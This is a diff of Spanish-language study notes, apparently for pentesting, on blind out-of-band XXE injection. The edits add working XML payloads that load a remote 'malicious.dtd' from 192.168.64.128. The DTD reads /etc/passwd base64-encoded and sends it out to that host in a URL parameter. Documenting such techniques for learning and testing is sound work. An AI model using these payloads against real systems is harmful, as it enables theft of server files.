@@ -49,18 +49,17 @@ Las entidades son una forma de representar un elemento de datos sin referenciar 
 # XXE Out Of Band interaction (OOB) 
 Estas mismas son lo mismo que las anteriores solo que a ciegas:
 ```xml
-<!DOCTYPE foo [<!ENTITY myFile SYSTEM "http://192.168.0.229/testXXE">]>
+<!DOCTYPE foo [<!ENTITY myFile SYSTEM "http://192.168.64.128/testXXE">]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.64.128/malicious.dtd"> %xxe;]> # ---> Lo declaro ahi mismo ya que a veces no te deja declararlo en el propio cuerpo. 
 ```
-**Archivo testXXE:**
+**Archivo malicious.dtd:**
 ```xml
-<!DOCTYPE foo [ 
-  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> 
-  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.64.128/?file=%file;'>"> 
-  %eval; 
-  %exfil; 
-]>
-
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> 
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.64.128/?file=%file;'>">
+%eval; 
+%exfil;
 ```
+-- -
 ## Aclaraciones:
 - Siempre hay que "invocar" el nombre de la entidad dentro de la estructura XML para asi ejecutar el payload. (&myFile dentro de algun tag). 
 
